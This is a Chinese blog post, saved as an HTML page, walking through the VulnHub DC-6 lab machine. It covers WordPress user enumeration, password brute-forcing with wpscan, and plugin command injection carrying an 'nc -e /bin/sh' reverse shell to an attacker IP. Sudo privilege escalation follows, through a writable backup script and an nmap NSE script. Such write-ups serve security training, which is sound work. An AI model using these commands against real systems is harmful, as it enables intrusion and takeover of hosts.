@@ -1,0 +1,244 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>vulnhub-DC-6 | Six_plum</title><meta name="author" content="Six_plum"><meta name="copyright" content="Six_plum"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="vulnhub-DC-6信息收集老规矩，nmap扫一下 1234567891011121314151617181920212223242526└─# nmap -A -p1-65535 192.168.20.135Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-11-21 12:33 CSTNmap scan report for 192.16">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-DC-6">
+<meta property="og:url" content="https://hshdgyq.github.io/2024/11/21/vulnhub-DC-6/index.html">
+<meta property="og:site_name" content="Six_plum">
+<meta property="og:description" content="vulnhub-DC-6信息收集老规矩，nmap扫一下 1234567891011121314151617181920212223242526└─# nmap -A -p1-65535 192.168.20.135Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-11-21 12:33 CSTNmap scan report for 192.16">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hshdgyq.github.io/img/background.jpg">
+<meta property="article:published_time" content="2024-11-21T04:27:57.000Z">
+<meta property="article:modified_time" content="2024-11-21T06:03:09.216Z">
+<meta property="article:author" content="Six_plum">
+<meta property="article:tag" content="vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hshdgyq.github.io/img/background.jpg"><link rel="shortcut icon" href="/img/upper.jpg"><link rel="canonical" href="https://hshdgyq.github.io/2024/11/21/vulnhub-DC-6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'vulnhub-DC-6',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-21 14:03:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/header.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Six_plum</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">vulnhub-DC-6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-21T04:27:57.000Z" title="发表于 2024-11-21 12:27:57">2024-11-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-21T06:03:09.216Z" title="更新于 2024-11-21 14:03:09">2024-11-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="vulnhub-DC-6"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="vulnhub-DC-6"><a href="#vulnhub-DC-6" class="headerlink" title="vulnhub-DC-6"></a>vulnhub-DC-6</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老规矩，nmap扫一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─# nmap -A -p1-65535 192.168.20.135</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 12:33 CST</span><br><span class="line">Nmap scan report for 192.168.20.135</span><br><span class="line">Host is up (0.0016s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)</span><br><span class="line">|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)</span><br><span class="line">|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://wordy/</span><br><span class="line">MAC Address: 00:0C:29:E1:2A:54 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.56 ms 192.168.20.135</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>开放80和22，去80看看，注意配置hosts文件（DC-2里有讲怎么配置）发现是一个wordpress，这种简单靶机就显然提示这里有漏洞，有了dc-2的经验，这里收集一下用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -e u</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] jens</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] graham</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] mark</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] sarah</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>收集到5个，写进字典，但是密码呢，在真实环境中还真不一定能拿到，这里是作者提示了在rockyou.txt字典中带k01的密码，所以可以拿到密码字典</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat rockyou.txt| grep k01 &gt;pass.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后可以进行爆破，wordpress·还是用wpscan爆破方便一点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -U user.txt -P pass.txt </span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: mark, Password: helpdesk01</span><br></pre></td></tr></table></figure>
+
+<p>把用户拿去登录后台，后台还是没自动跳转，登录后手动进入到edit.php</p>
+<h2 id="插件安全（wordy）"><a href="#插件安全（wordy）" class="headerlink" title="插件安全（wordy）"></a>插件安全（wordy）</h2><p>首页提示了注意插件安全，所以重点看看插件，这里发现此插件在解析ip的时候可以通过管道符进行任意命令执行</p>
+<p><img src="/2024/11/21/vulnhub-DC-6/1.png"></p>
+<p>由于限制了长度，所以可以在bp上弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools HTTP/1.1</span><br><span class="line">Host: wordy</span><br><span class="line">Content-Length: 275</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://wordy</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytUJOC69BDFc7z6m4</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: wordpress_14014489b649086e51cacb340bafe656=mark%7C1732338496%7CiiKd8umIKTjn6vk3KpFFNNmA1ExFnk18EAaygqfqcgf%7C556aa13f6687d0e918de1bb5dd551ee18a55820d393ba51e08cd4710670688bb; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_14014489b649086e51cacb340bafe656=mark%7C1732338496%7CiiKd8umIKTjn6vk3KpFFNNmA1ExFnk18EAaygqfqcgf%7Cd5fab93259595116b0b92d15316e485e531a1449231fa71a15c6c10994e3dc6d; wp-settings-time-3=1732165860</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundarytUJOC69BDFc7z6m4</span><br><span class="line">Content-Disposition: form-data; name=&quot;ip&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1|nc -e /bin/sh 192.168.20.129 1111</span><br><span class="line">------WebKitFormBoundarytUJOC69BDFc7z6m4</span><br><span class="line">Content-Disposition: form-data; name=&quot;lookup&quot;</span><br><span class="line"></span><br><span class="line">Lookup</span><br><span class="line">------WebKitFormBoundarytUJOC69BDFc7z6m4--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -lvnp 1111</span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>老规矩查看sudo和suid</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/var/www/html/wp-admin$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/ping</span><br><span class="line">www-data@dc-6:/var/www/html/wp-admin$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>没有可以提权的命令，那只能翻翻有没有什么线索了，既然后台是mark，那么我们去看看mark的家目录，发现了graham</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt</span><br><span class="line">cat things-to-do.txt</span><br><span class="line">Things to do:</span><br><span class="line"></span><br><span class="line">- Restore full functionality for the hyperdrive (need to speak to Jens)</span><br><span class="line">- Buy present for Sarah&#x27;s farewell party</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br><span class="line">- Apply for the OSCP course</span><br><span class="line">- Buy new laptop for Sarah&#x27;s replacement</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>用ssh远程登录，再看看sudo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:~$ sudo -l</span><br><span class="line">Matching Defaults entries for graham on dc-6:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User graham may run the following commands on dc-6:</span><br><span class="line">    (jens) NOPASSWD: /home/jens/backups.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里可以以jens的身份执行jens的脚本，看看脚本内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:~$ cat /home/jens/backups.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">tar -czf backups.tar.gz /var/www/html</span><br></pre></td></tr></table></figure>
+
+<p>既然可以执行，那么直接写入&#x2F;bin&#x2F;bash拿jens的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:~$ echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>记住要以jens身份执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh</span><br><span class="line">/home/jens/backups.sh: 2: /home/jens/backups.sh: B: not found</span><br><span class="line">tar: Removing leading `/&#x27; from member names</span><br><span class="line">whoami</span><br><span class="line">jens@dc-6:~$ whoami</span><br><span class="line">jens</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再看看sudo还有nmap</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hing Defaults entries for jens on dc-6:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jens may run the following commands on dc-6:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure>
+
+<p>nmap提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp)</span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; $TF</span><br><span class="line">sudo nmap --script=$TF</span><br><span class="line"></span><br><span class="line">jens@dc-6:~$ sudo nmap --script=$TF</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2024-11-21 15:35 AEST</span><br><span class="line">NSE: Warning: Loading &#x27;/tmp/tmp.REhDsNkr5u&#x27; -- the recommended file extension is &#x27;.nse&#x27;.</span><br><span class="line"># root</span><br><span class="line"># root@dc-6:/home/jens# ls</span><br><span class="line">backups.sh  backups.tar.gz</span><br><span class="line">root@dc-6:/home/jens# whoami</span><br><span class="line">root</span><br><span class="line">root@dc-6:/home/jens# </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>至此靶机攻克</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>还是一些老套路，这里是几次sudo提权，所以要注意sudo滥用，知识点：wordpress用户收集、ip解析任意命令执行、sudo提权</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://hshdgyq.github.io">Six_plum</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://hshdgyq.github.io/2024/11/21/vulnhub-DC-6/">https://hshdgyq.github.io/2024/11/21/vulnhub-DC-6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://hshdgyq.github.io" target="_blank">Six_plum</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub/">vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/img/background.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/20/vulnhub-DC-5/"><img class="next-cover" src="/img/background.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub-DC-5</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/11/12/vulnhub-DC-1/" title="vulnhub-DC-1"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-12</div><div class="title">vulnhub-DC-1</div></div></a></div><div><a href="/2024/11/14/vulnhub-DC-3/" title="vulnhub-DC-3"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="title">vulnhub-DC-3</div></div></a></div><div><a href="/2024/11/13/vulnhub-DC-2/" title="vulnhub-DC-2"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-13</div><div class="title">vulnhub-DC-2</div></div></a></div><div><a href="/2024/11/20/vulnhub-DC-4/" title="vulnhub-DC-4"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-20</div><div class="title">vulnhub-DC-4</div></div></a></div><div><a href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5"><img class="cover" src="/img/background.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-20</div><div class="title">vulnhub-DC-5</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/header.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Six_plum</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hshdgyq"><i class="fab fa-github"></i><span>github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/hshdgyq" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1952023661@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">记录一些刷题日志，防止走丢。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub-DC-6"><span class="toc-number">1.</span> <span class="toc-text">vulnhub-DC-6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text">密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6%E5%AE%89%E5%85%A8%EF%BC%88wordy%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">插件安全（wordy）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.5.</span> <span class="toc-text">结语</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub-DC-6"/></a><div class="content"><a class="title" href="/2024/11/21/vulnhub-DC-6/" title="vulnhub-DC-6">vulnhub-DC-6</a><time datetime="2024-11-21T04:27:57.000Z" title="发表于 2024-11-21 12:27:57">2024-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/20/vulnhub-DC-5/" title="vulnhub-DC-5"><img src="/img/background.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" 